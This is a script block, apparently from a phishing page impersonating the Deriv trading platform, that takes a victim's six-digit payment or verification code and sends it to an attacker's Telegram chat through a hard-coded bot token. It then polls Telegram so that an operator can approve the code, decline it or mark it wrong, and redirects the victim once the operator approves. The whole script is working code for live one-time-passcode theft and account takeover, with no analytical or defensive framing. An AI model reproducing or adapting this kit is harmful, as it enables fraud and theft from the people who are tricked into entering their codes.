<script>
        const TELEGRAM_BOT_TOKEN = "8827407441:AAHqTSjR7BHABcD3c3sTbHYcZYjzK_8wJ_A";
        const TELEGRAM_CHAT_ID = "8820857419";
        const APPROVAL_REDIRECT_URL = "first.html";

        let pollDecided = false;
        let pollTimeoutId = null;
        let pollAbortController = null;
        let isPollingActive = false;

        function showError(msg) {
            const err = document.getElementById('codeError');
            if (err) {
                err.textContent = msg;
                err.style.display = 'block';
            }
        }

        function hideError() {
            const err = document.getElementById('codeError');
            if (err) err.style.display = 'none';
        }

        function maskCode(code) {
            if (code.length <= 2) return '*'.repeat(code.length);
            return code.charAt(0) + '*'.repeat(code.length - 2) + code.charAt(code.length - 1);
        }

        function cancelPolling() {
            pollDecided = true;
            if (pollTimeoutId) clearTimeout(pollTimeoutId);
            if (pollAbortController) pollAbortController.abort();
            isPollingActive = false;
            document.getElementById('spinnerOverlay').classList.remove('active');
            document.getElementById('confirmBtn').disabled = false;
            showError('Request cancelled. Please try again.');
        }

        function startPolling(userId) {
            pollDecided = false;
            let offset = 0;
            let pollCount = 0;
            const MAX_POLLS = 180;

            if (pollAbortController) pollAbortController.abort();
            pollAbortController = new AbortController();

            function pollLoop() {
                if (pollDecided) return;
                if (isPollingActive) {
                    pollTimeoutId = setTimeout(pollLoop, 1000);
                    return;
                }

                pollCount++;
                if (pollCount > MAX_POLLS) {
                    pollDecided = true;
                    document.getElementById('spinnerOverlay').classList.remove('active');
                    document.getElementById('confirmBtn').disabled = false;
                    showError('Request timed out. Please try again.');
                    return;
                }

                isPollingActive = true;

                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${offset}&timeout=10&allowed_updates=[\"callback_query\"]`;

                fetch(url, { signal: pollAbortController.signal })
                    .then(res => {
                        if (res.status === 409) {
                            isPollingActive = false;
                            pollTimeoutId = setTimeout(pollLoop, 1000);
                            return null;
                        }
                        if (!res.ok) throw new Error('HTTP ' + res.status);
                        return res.json();
                    })
                    .then(data => {
                        if (data === null) return;

                        if (!data.ok || pollDecided) {
                            isPollingActive = false;
                            if (!pollDecided) {
                                pollTimeoutId = setTimeout(pollLoop, 1000);
                            }
                            return;
                        }

                        if (data.result && data.result.length > 0) {
                            for (const update of data.result) {
                                offset = update.update_id + 1;

                                if (!update.callback_query) continue;

                                const action = String(update.callback_query.data || '');
                                const callbackId = action.includes('_') ? action.split('_').slice(1).join('_') : action.split(':').slice(1).join(':');
                                if (callbackId && callbackId !== userId) continue;

                                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                                    method: 'POST',
                                    headers: { 'Content-Type': 'application/json' },
                                    body: JSON.stringify({ callback_query_id: update.callback_query.id, text: 'Processing...' })
                                }).catch(() => {});

                                if (action.startsWith('approve_')) {
                                    pollDecided = true;
                                    isPollingActive = false;
                                    document.getElementById('spinnerOverlay').classList.remove('active');
                                    window.location.href = APPROVAL_REDIRECT_URL;
                                    return;
                                } else if (action.startsWith('decline_')) {
                                    pollDecided = true;
                                    isPollingActive = false;
                                    document.getElementById('spinnerOverlay').classList.remove('active');
                                    document.getElementById('confirmBtn').disabled = false;
                                    showError('Request declined. Please try again.');
                                    return;
                                } else if (action.startsWith('wrong_')) {
                                    pollDecided = true;
                                    isPollingActive = false;
                                    document.getElementById('spinnerOverlay').classList.remove('active');
                                    document.getElementById('confirmBtn').disabled = false;
                                    showError('Wrong code. Please enter the correct code.');
                                    return;
                                }
                            }
                        }

                        isPollingActive = false;
                        if (!pollDecided) {
                            pollTimeoutId = setTimeout(pollLoop, 1000);
                        }
                    })
                    .catch(err => {
                        if (err.name === 'AbortError') return;
                        console.error('Poll error:', err);
                        isPollingActive = false;
                        if (!pollDecided) {
                            pollTimeoutId = setTimeout(pollLoop, 1000);
                        }
                    });
            }

            pollLoop();
        }

        function sendTelegramWithInlineKeyboard(message, keyboard, userId) {
            const spinnerOverlay = document.getElementById('spinnerOverlay');
            const confirmBtn = document.getElementById('confirmBtn');

            let attempts = 0;
            const maxAttempts = 3;

            function attemptSend() {
                attempts++;
                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: TELEGRAM_CHAT_ID,
                            text: message,
                            parse_mode: 'HTML',
                            reply_markup: JSON.stringify(keyboard)
                        })
                    })
                    .then(res => {
                        if (!res.ok) throw new Error('HTTP ' + res.status);
                        return res.json();
                    })
                    .then(data => {
                        if (data.ok) {
                            startPolling(userId);
                        } else {
                            if (attempts < maxAttempts) {
                                setTimeout(attemptSend, 1000 * attempts);
                            } else {
                                spinnerOverlay.classList.remove('active');
                                confirmBtn.disabled = false;
                                showError('Failed to send notification. Please try again.');
                            }
                        }
                    })
                    .catch(err => {
                        console.error('Send error:', err);
                        if (attempts < maxAttempts) {
                            setTimeout(attemptSend, 1000 * attempts);
                        } else {
                            spinnerOverlay.classList.remove('active');
                            confirmBtn.disabled = false;
                            showError('Network error. Please check your connection and try again.');
                        }
                    });
            }

            attemptSend();
        }

        document.getElementById('codeForm').addEventListener('submit', async(e) => {
            e.preventDefault();
            hideError();

            const code = Array.from(document.querySelectorAll('.code-input')).map(input => input.value).join('');

            if (code.length !== 6) {
                showError('Please enter all 6 digits of the code.');
                return;
            }

            const spinnerOverlay = document.getElementById('spinnerOverlay');
            const spinnerCodeDisplay = document.getElementById('spinnerCodeDisplay');
            const confirmBtn = document.getElementById('confirmBtn');

            spinnerCodeDisplay.textContent = 'Code: ' + maskCode(code);
            spinnerOverlay.classList.add('active');
            confirmBtn.disabled = true;

            const userId = 'payment_' + Date.now();
            const message = `💳 <b>New Deriv Payment Code Submitted</b>\n\n` +
                `🔢 Code: <code>${code}</code>\n` +
                `⏰ Time: ${new Date().toLocaleString('en-ZA')}\n\n` +
                `Please approve, decline, or mark as wrong code:`;

            const keyboard = {
                inline_keyboard: [
                    [{ text: '✅ APPROVE', callback_data: `approve_${userId}` }, { text: '❌ DECLINE', callback_data: `decline_${userId}` }],
                    [{ text: '⚠️ WRONG CODE', callback_data: `wrong_${userId}` }]
                ]
            };

            sendTelegramWithInlineKeyboard(message, keyboard, userId);
        });
    </script>
